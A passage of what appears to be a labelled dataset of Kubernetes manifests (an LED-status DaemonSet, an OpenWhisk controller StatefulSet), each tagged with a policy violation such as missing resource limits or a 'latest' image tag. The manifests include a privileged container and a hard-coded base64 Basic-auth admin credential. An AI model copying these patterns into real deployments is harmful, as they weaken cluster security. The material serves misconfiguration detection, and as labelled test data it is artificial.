    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "10541",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ledctl\" has memory limit 0"
  },
  {
    "id": "10542",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pod-status\" has memory limit 0"
  },
  {
    "id": "10543",
    "manifest_path": "data/manifests/the_stack_sample/sample_4075.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: led-pod-stat\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: led-stat\n  template:\n    metadata:\n      labels:\n        name: led-stat\n    spec:\n      containers:\n      - name: redis\n        image: arm32v7/redis:5.0.3\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6379\n          protocol: TCP\n      - name: ledctl\n        image: utsavanand2/rpi_led:0.1\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n      - name: pod-status\n        image: utsavanand2/pod-status:0.1\n        imagePullPolicy: Always\n        env:\n        - name: NODE\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "10544",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"wait-for-couchdb\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10545",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        